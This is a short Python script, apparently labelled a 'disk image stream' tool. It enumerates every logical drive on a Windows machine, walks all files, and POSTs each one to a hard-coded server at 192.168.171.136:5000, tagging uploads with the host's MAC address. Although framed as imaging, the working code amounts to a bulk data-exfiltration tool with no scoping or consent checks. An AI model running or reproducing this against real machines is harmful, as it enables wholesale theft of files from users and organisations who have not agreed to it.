import os
import requests
import win32api
import win32file
import uuid
import logging

# Setup logging
log_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'disk_image_stream.log')
logging.basicConfig(filename=log_file_path, level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

logging.info("Script started.")

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    return mac.replace(":", "")

def stream_file(file_path, server_address, server_port, file_prefix):
    url = f'http://{server_address}:{server_port}/stream'
    try:
        with open(file_path, 'rb') as f:
            logging.info(f"Streaming file {file_prefix} from {file_path}")
            response = requests.post(url, params={'filename': file_prefix}, data=f)
            response.raise_for_status()
            logging.info(f"Finished streaming file {file_prefix} to {server_address}:{server_port}")
    except Exception as e:
        logging.error(f"Error streaming file {file_prefix}: {e}")

def get_logical_drives():
    drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
    return drives

def get_all_files_in_drive(drive):
    all_files = []
    for root, dirs, files in os.walk(drive):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files

def main():
    server_address = '192.168.171.136'  # Change to your server address
    server_port = 5000

    logging.info("Starting disk image stream script.")

    mac_address = get_mac_address()
    logging.info(f"MAC address: {mac_address}")

    logical_drives = get_logical_drives()
    logging.info(f"Logical drives found: {logical_drives}")

    for drive in logical_drives:
        drive_letter = drive.replace("\\", "").replace(":", "")
        all_files = get_all_files_in_drive(drive)
        for file in all_files:
            file_prefix = f"{drive_letter}_{mac_address}_{os.path.basename(file)}"
            logging.info(f"Starting stream for {file_prefix}")
            stream_file(file, server_address, server_port, file_prefix)

    logging.info("Finished disk image stream script.")

if __name__ == "__main__":
    main()
